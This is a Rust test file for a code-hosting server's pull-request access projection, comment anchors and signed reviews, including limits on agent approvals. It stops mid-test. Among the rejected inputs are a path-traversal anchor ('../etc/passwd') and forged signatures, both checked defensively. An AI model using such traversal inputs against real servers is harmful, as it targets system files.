//! PRs and review (milestone S21; phase-4 design §4.9, threats 7, 15, 16;
//! `docs/HUB.md` §13.24).
//!
//! The central check is **projection equivalence for PRs**: for random
//! histories, random stacks of PRs (several revisions, threads anchored to
//! lines) and every kind of viewer,
//!
//! * the PRs a viewer may list, count, search and open are exactly those
//!   whose every revision touched only paths the viewer may read, computed
//!   here straight from the files of each change (no server code);
//! * every answer about such a PR, the viewer's diffs and threads included,
//!   is the answer its admin gets on a copy of the project built only from
//!   the viewer's projected history, with the same PRs made there from the
//!   viewer's ids;
//! * every other PR answers exactly like an id nobody made.

use std::collections::{BTreeMap, BTreeSet, HashMap};

use serde_json::{json, Value};
use veil_core::{crypto::domains::SIG_CONTEXT_HUB_PR_REVIEW, hub::pr::review_message, ObjectId};
use veil_server::{
    auth::{Caller, Person as AuthPerson},
    error::Error,
    perm::Viewer,
    prs::{self, threads::AnchorRequest, CreatePr, ListParams, NewThread, PrDiffParams, RevisionRequest},
    query::Ask,
    sync::root_snapshot_id,
};

use crate::{
    derived::{again, copy_for, policy, projections, random_history, text, viewers, Files, Hist, Rng},
    support::*,
};

fn seeds(default: &[u64]) -> Vec<u64> {
    match std::env::var("VEIL_PR_SEED").ok().and_then(|s| s.parse::<u64>().ok()) {
        Some(s) => (s..s + default.len() as u64).collect(),
        None => default.to_vec(),
    }
}

/// A person row of the server (PR authors must be people).
fn person_row(th: &TestHub, prefix: &str) -> (i64, String) {
    let hub = th.hub();
    let name = unique(prefix);
    let id = th.rt.block_on(again(|| sqlx::query_scalar("INSERT INTO people (name, created_at) VALUES ($1, 0) RETURNING id").bind(&name).fetch_one(&hub.db)));
    (id, name)
}

fn caller(id: i64, name: &str) -> Caller {
    Caller {
        person: Some(AuthPerson {
            id,
            name: name.to_string(),
            device_key: "00".repeat(32),
        }),
        epochs: Default::default(),
    }
}

fn ask_as(th: &TestHub, h: &Hist, viewer: &Viewer) -> Ask {
    Ask {
        project: h.project(th),
        viewer: viewer.clone(),
        policy_version: 1,
    }
}

fn admin_of(person: i64) -> Viewer {
    Viewer {
        person: Some(person),
        admin: true,
        ..Viewer::default()
    }
}

/// Drop what differs between two projects by construction: PR, thread and
/// comment ids, times, the policy version.
fn strip(v: &mut Value) {
    match v {
        Value::Object(m) => {
            for k in ["id", "pr", "created_at", "updated_at", "at", "policy_version", "next", "comments_next"] {
                m.remove(k);
            }
            m.values_mut().for_each(strip);
        }
        Value::Array(a) => a.iter_mut().for_each(strip),
        _ => {}
    }
}

fn norm(r: veil_server::error::Result<Value>) -> String {
    match r {
        Ok(mut v) => {
            strip(&mut v);
            v.to_string()
        }
        Err(Error::Api { status, code, message }) => format!("error {status} {code} {message}"),
        Err(e) => panic!("internal error: {e:?}"),
    }
}

/// One PR the harness made: its title (unique), its heads per revision, and
/// the thread anchors it asked for after the first revision.
struct Made {
    title: String,
    heads: Vec<ObjectId>,
    anchors: Vec<AnchorRequest>,
    /// Every path any change of any revision touched (from the files).
    touched: BTreeSet<String>,
}

/// The paths that differ between two file maps (an empty folder `d/` is
/// the path `d`).
fn differ(a: &Files, b: &Files) -> BTreeSet<String> {
    a.keys()
        .chain(b.keys())
        .filter(|k| a.get(*k) != b.get(*k))
        .map(|k| k.trim_end_matches('/').to_string())
        .collect()
}

const PR_DIRS: &[&str] = &["pub", "pub", "pub", "pub/sec", "fin", "carol-d", "", "pub/deep"];

fn join(d: &str, n: &str) -> String {
    if d.is_empty() {
        n.to_string()
    } else {
        format!("{d}/{n}")
    }
}

/// One edit of a change, applied by path (so it can be replayed on
/// another base: a rebase).
#[derive(Clone)]
enum Op {
    Append(String, String),
    Put(String, Vec<u8>),
}

fn random_ops(rng: &mut Rng, files: &Files, tag: &str, i: usize) -> Vec<Op> {
    let mut ops = Vec::new();
    for j in 0..1 + rng.below(2) {
        let d = PR_DIRS[rng.below(PR_DIRS.len())];
        match rng.below(6) {
            0 => {
                // An edit of an existing file of the folder, if any.
                let mine: Vec<String> = files.keys().filter(|k| !k.ends_with('/') && k.starts_with(d)).cloned().collect();
                if let Some(p) = mine.get(rng.below(mine.len().max(1))) {
                    ops.push(Op::Append(p.clone(), format!("edited by {tag} {i}\n")));
                }
            }
            1 => ops.push(Op::Put(format!("{}/", join(d, &format!("empty-{tag}-{i}-{j}"))), Vec::new())),
            2 => ops.push(Op::Put(join(d, "Cargo.toml"), format!("[package] # {tag} {i}\n").into_bytes())),
            _ => {
                let p = join(d, &format!("pr-{tag}-{i}-{j}.rs"));
                let n = 4 + rng.below(8);
                ops.push(Op::Put(p.clone(), text(rng, &p, n)));
            }
        }
    }
    ops
}

fn apply(files: &mut Files, ops: &[Op]) {
    for op in ops {
        match op {
            Op::Append(p, l) => {
                if let Some(t) = files.get_mut(p) {
                    t.extend(l.bytes());
                }
            }
            Op::Put(p, c) => {
                files.insert(p.clone(), c.clone());
            }
        }
    }
}

/// A stack of changes on `base`, one per entry of `ops` with the given
/// change ids and timestamps; returns the head.
fn stack(th: &TestHub, h: &mut Hist, base: ObjectId, changes: &[[u8; 16]], ops: &[Vec<Op>], times: &[i64], touched: &mut BTreeSet<String>) -> ObjectId {
    let mut x = base;
    for ((c, ops), t) in changes.iter().zip(ops).zip(times) {
        let before = h.files[&x].clone();
        let mut files = before.clone();
        apply(&mut files, ops);
        touched.extend(differ(&before, &files));
        x = h.commit(th, &[x], files, *c, *t, None);
    }
    x
}

/// The first-parent line of `main`, tip first.
fn main_line(h: &Hist) -> Vec<ObjectId> {
    let mut out = vec![h.branches["main"]];
    while let Some(p) = h.parents[out.last().unwrap()].first() {
        out.push(*p);
    }
    out
}

/// The text files `head`'s change changed against its parent (anchors).
fn changed_text(h: &Hist, head: ObjectId) -> Vec<String> {
    let (now, before) = (&h.files[&head], &h.files[&h.parents[&head][0]]);
    now.keys().filter(|k| !k.ends_with('/') && before.get(*k) != now.get(*k)).cloned().collect()
}

/// Make the PRs of one random project, as its admin `author`.
fn make_prs(th: &TestHub, h: &mut Hist, rng: &mut Rng, author: (i64, &str), n: usize) -> Vec<Made> {
    let line = main_line(h);
    let mut ts = 1_900_000_000_000i64;
    let mut out = Vec::new();
    for k in 0..n {
        let len = 1 + rng.below(3);
        let changes: Vec<[u8; 16]> = (0..len).map(|i| {
            let mut c = [0u8; 16];
            c[..8].copy_from_slice(&(rng.next()).to_le_bytes());
            c[8] = k as u8;
            c[9] = i as u8;
            c
        }).collect();
        let mut touched = BTreeSet::new();
        let mut heads = Vec::new();
        let revs = 1 + rng.below(3);
        let mut ops: Vec<Vec<Op>> = Vec::new();
        let mut times: Vec<i64> = Vec::new();
        let mut at = rng.below(line.len().min(6));
        for r in 0..revs {
            // Revisions keep the change ids. Some are rebases only (the same
            // edits on another base: a viewer who cannot see what changed
            // between the bases sees one revision); some drop the top
            // change; the rest are new edits.
            let rebase = r > 0 && rng.chance(40) && at > 0;
            at = if rebase { at - 1 } else { rng.below(line.len().min(6)) };
            let base = line[at];
            let mut cs = changes.clone();
            if !rebase {
                if r > 0 && rng.chance(30) && cs.len() > 1 {
                    cs.pop();
                }
                ops = cs.iter().enumerate().map(|(i, _)| random_ops(rng, &h.files[&base], &format!("{k}r{r}"), i)).collect();
                times = cs.iter().map(|_| {
                    ts += 1000;
                    ts
                }).collect();
            }
            // A rebase keeps each change's time, so a change whose new base
            // differs only in what a viewer cannot see is, to them, the
            // same snapshot as before.
            let cs = &cs[..ops.len().min(cs.len())];
            heads.push(stack(th, h, base, cs, &ops, &times, &mut touched));
        }
        let anchors = changed_text(h, heads[0])
            .into_iter()
            .take(1)
            .map(|path| AnchorRequest { change: None, path, side: Some("new".into()), start: 1, end: Some(1) })
            .collect();
        out.push(Made { title: format!("PR {k} token{:04x}", rng.next() % 0xffff), heads, anchors, touched });
    }
    let _ = author;
    out
}

/// Make `m` in the project `h` names, as `who` (an admin there), from the
/// heads `head_ids` (ids of that project's history): create, thread, then
/// each later revision. Answers its id.
fn replay(th: &TestHub, h: &Hist, who: &Caller, viewer: &Viewer, m: &Made, head_ids: &[ObjectId]) -> String {
    let a = ask_as(th, h, viewer);
    let hub = h.hub.clone();
    th.rt.block_on(async {
        let v = prs::create(&hub, &a, who, CreatePr { head: head_ids[0].hex(), onto: Some("main".into()), title: m.title.clone(), body: Some(format!("body of {}", m.title)) })
            .await
            .unwrap_or_else(|e| panic!("create {}: {e:?}", m.title));
        let id = v["id"].as_str().unwrap().to_string();
        prs::new_thread(&hub, &a, who, &id, NewThread { body: "on the whole PR".into(), anchor: None }).await.unwrap();
        for an in &m.anchors {
            prs::new_thread(&hub, &a, who, &id, NewThread { body: format!("about {}", an.path), anchor: Some(an.clone()) })
                .await
                .unwrap_or_else(|e| panic!("anchor {an:?}: {e:?}"));
        }
        for head in &head_ids[1..] {
            match prs::add_revision(&hub, &a, who, &id, RevisionRequest { head: head.hex() }).await {
                Ok(_) => {}
                // A revision equal to the last one (the copy may see two
                // real revisions as one) is refused the same way in both.
                Err(Error::Api { code: "bad_request", message, .. }) if message.contains("already") => {}
                Err(e) => panic!("revision of {}: {e:?}", m.title),
            }
        }
        id
    })
}

/// Every answer of one viewer about one PR id.
fn answers(th: &TestHub, h: &Hist, a: &Ask, id: &str) -> Vec<String> {
    let hub = h.hub.clone();
    th.rt.block_on(async {
        let mut out = vec![norm(prs::show(&hub, a, id).await), norm(prs::threads_json(&hub, a, id, None).await)];
        out.push(norm(prs::diff(&hub, a, id, PrDiffParams::default()).await));
        out.push(norm(prs::diff(&hub, a, id, PrDiffParams { stat: Some(true), revision: Some(1), ..Default::default() }).await));
        if let Ok(v) = prs::show(&hub, a, id).await {
            for r in v["revisions"].as_array().unwrap() {
                for c in r["changes"].as_array().unwrap() {
                    let p = PrDiffParams { revision: r["n"].as_i64().map(|n| n as i32), change: c["change_id"].as_str().map(str::to_string), stat: None };
                    out.push(norm(prs::diff(&hub, a, id, p).await));
                }
            }
        }
        out
    })
}

fn listed(th: &TestHub, h: &Hist, a: &Ask, q: ListParams) -> (Vec<String>, i64) {
    let v = th.rt.block_on(prs::list(&h.hub, a, q)).unwrap();
    (v["prs"].as_array().unwrap().iter().map(|p| p["title"].as_str().unwrap().to_string()).collect(), v["count"].as_i64().unwrap())
}

#[test]
fn pr_projection_equivalence() {
    let th = TestHub::start();
    let mut collapsed = 0;
    for seed in seeds(&[301, 302, 303]) {
        let carol = 720_000 + seed as i64;
        let (policy_text, bindings) = policy(carol);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let mut rng = Rng::new(seed);
        random_history(&th, &mut h, &mut rng, 30);
        let (author, author_name) = person_row(&th, "author");
        let me = caller(author, &author_name);
        let made = make_prs(&th, &mut h, &mut rng, (author, &author_name), 16);
        let project = h.project(&th);
        let ids: Vec<String> = made.iter().map(|m| replay(&th, &h, &me, &admin_of(author), m, &m.heads)).collect();
        let never = "pr-0badc0de";
        let (mut compared, mut shown_somewhere, mut hidden_somewhere) = (0, 0, 0);
        for (who, viewer) in viewers(carol) {
            let view = project.view(&viewer);
            let a = ask_as(&th, &h, &viewer);
            let sees: Vec<bool> = made.iter().map(|m| m.touched.iter().all(|p| view.read(p))).collect();
            // Lists, counts and search hold exactly the PRs the viewer may see.
            let (mut titles, count) = listed(&th, &h, &a, ListParams { state: Some("all".into()), n: Some(200), ..Default::default() });
            titles.sort();
            let mut want: Vec<String> = made.iter().zip(&sees).filter(|(_, s)| **s).map(|(m, _)| m.title.clone()).collect();
            want.sort();
            assert_eq!(titles, want, "seed {seed}, {who}: listed");
            assert_eq!(count, want.len() as i64, "seed {seed}, {who}: count");
            for (m, s) in made.iter().zip(&sees) {
                let token = m.title.rsplit(' ').next().unwrap();
                let (found, n) = listed(&th, &h, &a, ListParams { state: Some("all".into()), q: Some(token.into()), ..Default::default() });
                assert_eq!((found.len(), n), if *s { (1, 1) } else { (0, 0) }, "seed {seed}, {who}: search {token}");
            }
            // Pages of one cover the same list.
            let mut paged = Vec::new();
            let mut after = None;
            loop {
                let v = th.rt.block_on(prs::list(&h.hub, &a, ListParams { state: Some("all".into()), n: Some(1), after: after.clone(), ..Default::default() })).unwrap();
                paged.extend(v["prs"].as_array().unwrap().iter().map(|p| p["title"].as_str().unwrap().to_string()));
                after = v["next"].as_str().map(str::to_string);
                if after.is_none() {
                    break;
                }
            }
            paged.sort();
            assert_eq!(paged, want, "seed {seed}, {who}: paged");
            // Every answer about a PR the viewer may see is the copy's.
            let p = projections(&th, &h, &project, &viewer);
            let copy = copy_for(&th, &h, &project, &viewer, &p);
            let copy_me = admin_of(author);
            let hidden_real: Vec<ObjectId> = h.order.iter().copied().filter(|s| p[s] != *s).collect();
            let hidden_paths: Vec<String> = made.iter().flat_map(|m| m.touched.iter().cloned()).filter(|k| !view.read(k)).collect();
            let missing = answers(&th, &h, &a, never);
            for ((m, s), id) in made.iter().zip(&sees).zip(&ids) {
                let real = answers(&th, &h, &a, id);
                if *s {
                    shown_somewhere += 1;
                    let pheads: Vec<ObjectId> = m.heads.iter().map(|x| p[x]).collect();
                    let cid = replay(&th, &copy, &me, &copy_me, m, &pheads);
                    let theirs = answers(&th, &copy, &ask_as(&th, &copy, &copy_me), &cid);
                    assert_eq!(real, theirs, "seed {seed}, {who}: {}", m.title);
                    compared += real.len();
                    let v = th.rt.block_on(prs::show(&h.hub, &a, id)).unwrap();
                    if (v["revisions"].as_array().unwrap().len()) < m.heads.len() {
                        collapsed += 1;
                    }
                } else {
                    hidden_somewhere += 1;
                    // Exactly like a PR nobody made, route by route.
                    assert_eq!(real.len(), missing.len());
                    assert_eq!(real, missing, "seed {seed}, {who}: hidden {}", m.title);
                }
                for ans in &real {
                    for s in &hidden_real {
                        assert!(!ans.contains(&s.hex()), "seed {seed}, {who}: real id {} in {ans}", s.short());
                    }
                    for k in &hidden_paths {
                        assert!(!ans.contains(&format!("\"{k}\"")), "seed {seed}, {who}: hidden path {k} in {ans}");
                    }
                    if !*s {
                        assert!(!ans.contains(&m.title), "seed {seed}, {who}: hidden title in {ans}");
                    }
                }
            }
        }
        assert!(shown_somewhere > 0 && hidden_somewhere > 0, "seed {seed}: the harness must exercise both");
        println!("seed {seed}: {} PRs, {compared} answers compared", made.len());
    }
    println!("{collapsed} times a viewer saw fewer revisions than were made");
    assert!(collapsed > 0, "the harness must exercise revisions that differ only in hidden content");
}

/// Union over revisions, and access-line changes (threat 7): a PR whose
/// later revision touched `fin/` stays hidden from those who cannot read
/// it, even after a third revision that touches only `pub/`; a new line
/// that hides a touched path hides the PR at the next request, and
/// removing it shows the PR again.
#[test]
fn prs_follow_revisions_and_access_lines() {
    let th = TestHub::start();
    let (policy_text, bindings) = policy(1);
    let mut h = Hist::new(&th, &policy_text, &bindings);
    let root = root_snapshot_id();
    let mut base = Files::new();
    base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
    base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
    let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
    h.set_branch(&th, "main", b);
    let (author, name) = person_row(&th, "author");
    let me = caller(author, &name);
    let admin = ask_as(&th, &h, &admin_of(author));
    let dev = Viewer { person: Some(800_001), groups: [900_001].into_iter().collect(), ..Viewer::default() };
    let mut f1 = base.clone();
    f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
    let r1 = h.commit(&th, &[b], f1.clone(), [2; 16], 2_000, None);
    let mut f2 = f1.clone();
    f2.insert("fin/ledger.txt".into(), b"ledger, edited\n".to_vec());
    let r2 = h.commit(&th, &[b], f2, [2; 16], 3_000, None);
    let mut f3 = f1;
    f3.insert("pub/b.rs".into(), b"fn b() { 1 }\n".to_vec());
    let r3 = h.commit(&th, &[b], f3, [2; 16], 4_000, None);
    let hub = h.hub.clone();
    let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "union".into(), ..Default::default() })).unwrap()["id"].as_str().unwrap().to_string();
    let sees = |v: &Viewer| th.rt.block_on(prs::show(&hub, &ask_as(&th, &h, v), &id)).is_ok();
    assert!(sees(&dev), "revision 1 touches pub/ only");
    th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() })).unwrap();
    assert!(!sees(&dev), "revision 2 touched fin/");
    th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r3.hex() })).unwrap();
    assert!(!sees(&dev), "the union over every revision decides");
    assert!(sees(&Viewer { person: Some(800_005), groups: [900_001, 900_003].into_iter().collect(), ..Viewer::default() }));

    // A second PR of pub/ only; then a line makes pub/b.rs private.
    let id2 = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r3.hex(), title: "pub only".into(), ..Default::default() })).unwrap()["id"].as_str().unwrap().to_string();
    let count = |v: &Viewer| th.rt.block_on(prs::list(&hub, &ask_as(&th, &h, v), ListParams::default())).unwrap()["count"].as_i64().unwrap();
    assert_eq!(count(&dev), 1);
    assert_eq!(count(&Viewer::default()), 1, "public folders: anyone on Earth");
    let set = |t: &str| {
        th.rt.block_on(again(|| sqlx::query("UPDATE projects SET policy_text = $1, policy_version = policy_version + 1 WHERE id = $2").bind(t).bind(h.id).execute(&hub.db)));
    };
    set(&format!("{policy_text}pub/b.rs security\n"));
    assert_eq!(count(&dev), 0, "pub/b.rs is security's now");
    assert_eq!(count(&Viewer::default()), 0);
    assert!(th.rt.block_on(prs::show(&hub, &ask_as(&th, &h, &dev), &id2)).is_err());
    let sec = Viewer { person: Some(800_002), groups: [900_001, 900_002].into_iter().collect(), ..Viewer::default() };
    assert_eq!(count(&sec), 1);
    set(&policy_text);
    assert_eq!(count(&dev), 1, "the line is gone again");
}

/// Anchors move with the lines they name, and become outdated when those
/// lines change (`docs/HUB.md` §7.3).
#[test]
fn pr_anchors_survive_revisions() {
    let th = TestHub::start();
    let (policy_text, bindings) = policy(1);
    let mut h = Hist::new(&th, &policy_text, &bindings);
    let root = root_snapshot_id();
    let body: String = (1..=20).map(|i| format!("line {i}\n")).collect();
    let mut base = Files::new();
    base.insert("pub/a.rs".into(), body.clone().into_bytes());
    let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
    h.set_branch(&th, "main", b);
    let with = |t: String| {
        let mut f = base.clone();
        f.insert("pub/a.rs".into(), t.into_bytes());
        f
    };
    let v1 = body.replace("line 10\n", "line ten\n");
    let r1 = h.commit(&th, &[b], with(v1.clone()), [2; 16], 2_000, None);
    // Two lines added at the top: the anchors on 10 and 15 move by two.
    let r2 = h.commit(&th, &[b], with(format!("new 1\nnew 2\n{v1}")), [2; 16], 3_000, None);
    // Line 17 (once 15) changed: that anchor is outdated, the other stays.
    let v3 = format!("new 1\nnew 2\n{v1}").replace("line 15\n", "line fifteen\n");
    let r3 = h.commit(&th, &[b], with(v3), [2; 16], 4_000, None);
    let (author, name) = person_row(&th, "author");
    let me = caller(author, &name);
    let admin = ask_as(&th, &h, &admin_of(author));
    let hub = h.hub.clone();
    let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "anchors".into(), ..Default::default() })).unwrap()["id"].as_str().unwrap().to_string();
    for (start, end) in [(10, 10), (15, 16), (1, 2)] {
        let an = AnchorRequest { change: None, path: "pub/a.rs".into(), side: Some("new".into()), start, end: Some(end) };
        th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: format!("at {start}"), anchor: Some(an) })).unwrap();
    }
    let at = |id: &str| -> Vec<Value> {
        let v = th.rt.block_on(prs::threads_json(&hub, &admin, id, None)).unwrap();
        v["threads"].as_array().unwrap().iter().map(|t| t["now"].clone()).collect()
    };
    assert_eq!(at(&id), vec![json!({"revision":1,"start":10,"end":10}), json!({"revision":1,"start":15,"end":16}), json!({"revision":1,"start":1,"end":2})]);
    th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() })).unwrap();
    assert_eq!(at(&id), vec![json!({"revision":2,"start":12,"end":12}), json!({"revision":2,"start":17,"end":18}), json!({"revision":2,"start":3,"end":4})]);
    th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r3.hex() })).unwrap();
    assert_eq!(at(&id), vec![json!({"revision":3,"start":12,"end":12}), Value::Null, json!({"revision":3,"start":3,"end":4})]);
    let v = th.rt.block_on(prs::threads_json(&hub, &admin, &id, None)).unwrap();
    assert_eq!(v["threads"][1]["outdated"], json!(true));
    // Hostile anchors: out of range, a path the change did not change, a
    // folder, a bad side, zero, reversed, too many lines.
    for (path, side, start, end) in [
        ("pub/a.rs", "new", 0, 1),
        ("pub/a.rs", "new", 5, 4),
        ("pub/a.rs", "new", 1, 5000),
        ("pub/a.rs", "new", 30, 30),
        ("pub/a.rs", "sideways", 1, 1),
        ("pub/b.rs", "new", 1, 1),
        ("pub", "new", 1, 1),
        ("../etc/passwd", "new", 1, 1),
    ] {
        let an = AnchorRequest { change: None, path: path.into(), side: Some(side.into()), start, end: Some(end) };
        let r = th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "x".into(), anchor: Some(an) }));
        assert!(matches!(r, Err(Error::Api { code: "bad_request", .. })), "{path} {side} {start} {end}: {r:?}");
    }
}

/// Reviews (threats 15 and 16): signed by the reviewer's device over the
/// revision's patch; dismissed when the files change, kept over a rebase
/// that leaves them; never the author's; only from people who may write
/// every file; an agent's never counts where people are required.
#[test]
fn pr_reviews_and_the_gate() {
    let th = TestHub::start();
    let p = setup_project(&th);
    let hub = th.hub();
    let id_of = |who: &Person| -> i64 {
        th.rt.block_on(sqlx::query_scalar::<_, i64>("SELECT id FROM people WHERE name = $1").bind(&who.name).fetch_one(&hub.db)).unwrap()
    };
    let caller_of = |who: &Person| Caller {
        person: Some(AuthPerson { id: id_of(who), name: who.name.clone(), device_key: who.identity().verifying_hex() }),
        epochs: Default::default(),
    };
    let ask_of = |who: &Person| -> Ask {
        let c = caller_of(who);
        th.rt.block_on(Ask::open(&hub, &p.name, &c)).unwrap()
    };
    // The dev's change of src/, pushed on a branch.
    let dev_dir = p.dev.dir("clone");
    p.dev.clone_trusting(&th.url(&p.name), &dev_dir, &p.fp);
    write_files(&dev_dir, &[("src/review-me.rs", "fn review_me() {}\n")]);
    p.dev.ok(&dev_dir, &["commit", "--no-advance", "-m", "a change to review"]);
    p.dev.ok(&dev_dir, &["tag", "set", "feature-a1", "-r", "@-"]);
    p.dev.ok(&dev_dir, &["push"]);
    let dev = caller_of(&p.dev);
    let pr = th.rt.block_on(prs::create(&hub, &ask_of(&p.dev), &dev, CreatePr { head: "feature-a1".into(), title: "review me".into(), ..Default::default() })).unwrap();
    let id = pr["id"].as_str().unwrap().to_string();
    assert_eq!(pr["risk"], "normal");
    assert_eq!(pr["review"]["needs"], json!({"approvals": 1, "people_only": false}));
    let sign_for = |who: &Person, pr: &str, patch: &str, verdict: &str| who.identity().sign(SIG_CONTEXT_HUB_PR_REVIEW, &review_message(&p.name, pr, patch, verdict));
    let sign = |who: &Person, _rev: i64, patch: &str, verdict: &str| sign_for(who, &id, patch, verdict);
    let review = |who: &Person, _rev: i64, patch: &str, verdict: &str, sig: String| {
        th.rt.block_on(prs::add_review(&hub, &ask_of(who), &caller_of(who), &id, prs::ReviewRequest { patch: patch.into(), verdict: verdict.into(), body: None, signature: sig }))
    };
    let patch1 = pr["patch"].as_str().unwrap().to_string();
    // The author cannot approve; the finance member may not write src/.
    assert!(matches!(review(&p.dev, 1, &patch1, "approve", sign(&p.dev, 1, &patch1, "approve")), Err(Error::Api { code: "forbidden", .. })));
    assert!(th.rt.block_on(prs::show(&hub, &ask_of(&p.fin), &id)).is_ok(), "src/ is public");
    assert!(matches!(review(&p.fin, 1, &patch1, "approve", sign(&p.fin, 1, &patch1, "approve")), Err(Error::Api { code: "forbidden", .. })));
    // A forged signature, one for another verdict, PR or patch, or by
    // another device.
    for sig in [
        "00".repeat(64),
        "zz".into(),
        sign(&p.admin, 1, &patch1, "request-changes"),
        sign_for(&p.admin, "pr-00000000", &patch1, "approve"),
        sign(&p.admin, 1, "beef", "approve"),
        sign(&p.dev, 1, &patch1, "approve"),
    ] {
        assert!(matches!(review(&p.admin, 1, &patch1, "approve", sig), Err(Error::Api { code: "unauthorized", .. })));
    }
    let land = |who: &Person| th.rt.block_on(prs::land(&hub, &ask_of(who), &caller_of(who), &id));
    assert!(matches!(land(&p.dev), Err(Error::Api { code: "not_ready", .. })));
    let v = review(&p.admin, 1, &patch1, "approve", sign(&p.admin, 1, &patch1, "approve")).unwrap();
    assert_eq!(v["review"]["approvals"], 1);
    assert_eq!(v["review"]["ready"], true);
    assert!(matches!(land(&p.dev), Err(Error::Api { code: "landing_unavailable", .. })), "ready; S17 lands it");
    // Revision 2 adds a change that changes the file again: the approval
    // is dismissed (threat 15).
    write_files(&dev_dir, &[("src/review-me.rs", "fn review_me() { changed() }\n")]);
    p.dev.ok(&dev_dir, &["commit", "--no-advance", "-m", "and a fix"]);
    p.dev.ok(&dev_dir, &["tag", "set", "feature-a2", "-r", "@-"]);
    p.dev.ok(&dev_dir, &["push"]);
    let v = th.rt.block_on(prs::add_revision(&hub, &ask_of(&p.dev), &dev, &id, RevisionRequest { head: "feature-a2".into() })).unwrap();
    assert_eq!(v["revision"], 2);
    assert_ne!(v["patch"], json!(patch1));
    assert_eq!(v["review"]["approvals"], 0, "{v}");
    assert!(matches!(land(&p.dev), Err(Error::Api { code: "not_ready", .. })));
    // A review of the old patch is refused.
    assert!(matches!(review(&p.admin, 1, &patch1, "approve", sign(&p.admin, 1, &patch1, "approve")), Err(Error::Api { code: "conflict", .. })));
    let patch2 = v["patch"].as_str().unwrap().to_string();
    review(&p.admin, 2, &patch2, "request-changes", sign(&p.admin, 2, &patch2, "request-changes")).unwrap();
    // An agent session's approval (S11 sets the flag; written here) counts
    // for normal risk, never where people are required.
    let pid = th.rt.block_on(sqlx::query_scalar::<_, i64>("SELECT id FROM projects WHERE name = $1").bind(&p.name).fetch_one(&hub.db)).unwrap();
    let agent = th.hub();
    let (agent_id, agent_name) = person_row(&th, "agent");
    let devs: i64 = th.rt.block_on(sqlx::query_scalar("SELECT id FROM groups WHERE project_id = $1 AND name = 'devs'").bind(pid).fetch_one(&agent.db)).unwrap();
    th.rt.block_on(again(|| sqlx::query("INSERT INTO group_members (group_id, person_id) VALUES ($1, $2) ON CONFLICT DO NOTHING").bind(devs).bind(agent_id).execute(&agent.db)));
    let put_agent_review = |verdict: &str| {
        th.rt.block_on(again(|| sqlx::query(
            "INSERT INTO pr_reviews (project_id, pr, revision, person, verdict, patch, agent, device, signature, body, at) VALUES ($1, $2, 2, $3, $4, $5, TRUE, '', '', '', $6) \
             ON CONFLICT (project_id, pr, revision, person) DO UPDATE SET verdict = EXCLUDED.verdict, at = EXCLUDED.at")
            .bind(pid).bind(&id).bind(agent_id).bind(verdict).bind(&patch2).bind(veil_core::now_millis()).execute(&agent.db)));
    };
    put_agent_review("approve");
    let v = th.rt.block_on(prs::show(&hub, &ask_of(&p.dev), &id)).unwrap();
    assert_eq!(v["review"]["approvals"], 1, "an agent's approval counts for normal risk: {v}");
    assert_eq!(v["review"]["ready"], false, "the admin asked for changes");
    review(&p.admin, 2, &patch2, "approve", sign(&p.admin, 2, &patch2, "approve")).unwrap();
    assert!(matches!(land(&p.dev), Err(Error::Api { code: "landing_unavailable", .. })));
    // The same PR at high risk: the agent's approval no longer counts.
    th.rt.block_on(again(|| sqlx::query("UPDATE prs SET risk = 'high' WHERE project_id = $1 AND id = $2").bind(pid).bind(&id).execute(&agent.db)));
    let v = th.rt.block_on(prs::show(&hub, &ask_of(&p.dev), &id)).unwrap();
    assert_eq!(v["review"]["needs"], json!({"approvals": 1, "people_only": true}));
    assert_eq!(v["review"]["approvals"], 1, "the admin's counts, the agent's does not: {v}");
    let agent_counted: Vec<bool> = v["review"]["reviews"].as_array().unwrap().iter().filter(|r| r["by"] == json!(agent_name)).map(|r| r["counted"].as_bool().unwrap()).collect();
    assert_eq!(agent_counted, vec![false]);
    // Removing the admin's write access is not possible (admins write all);
    // removing the agent from devs drops its approval from the count.
    th.rt.block_on(again(|| sqlx::query("UPDATE prs SET risk = 'normal' WHERE project_id = $1 AND id = $2").bind(pid).bind(&id).execute(&agent.db)));
    th.rt.block_on(again(|| sqlx::query("DELETE FROM group_members WHERE group_id = $1 AND person_id = $2").bind(devs).bind(agent_id).execute(&agent.db)));
    let v = th.rt.block_on(prs::show(&hub, &ask_of(&p.dev), &id)).unwrap();
    assert_eq!(v["review"]["approvals"], 1, "only the admin's: {v}");
    // A request for changes holds the PR across a new revision, until that
    // reviewer approves the new patch.
    review(&p.admin, 2, &patch2, "request-changes", sign(&p.admin, 2, &patch2, "request-changes")).unwrap();
    write_files(&dev_dir, &[("src/review-me.rs", "fn review_me() { changed(); again() }\n")]);
    p.dev.ok(&dev_dir, &["commit", "--no-advance", "-m", "and another"]);
    p.dev.ok(&dev_dir, &["tag", "set", "feature-a3", "-r", "@-"]);
    p.dev.ok(&dev_dir, &["push"]);
    let v = th.rt.block_on(prs::add_revision(&hub, &ask_of(&p.dev), &dev, &id, RevisionRequest { head: "feature-a3".into() })).unwrap();
    assert_eq!(v["review"]["ready"], false, "{v}");
    assert!(v["review"]["reasons"].to_string().contains("asked for changes"), "{v}");
    let patch3 = v["patch"].as_str().unwrap().to_string();
    let v = review(&p.admin, 3, &patch3, "approve", sign(&p.admin, 3, &patch3, "approve")).unwrap();
    assert!(!v["review"]["reasons"].to_string().contains("asked for changes"), "{v}");
    // Closing: the author or an admin; then nothing lands or changes.
    assert!(matches!(th.rt.block_on(prs::close(&hub, &ask_of(&p.fin), &caller_of(&p.fin), &id)), Err(Error::Api { code: "forbidden", .. })));
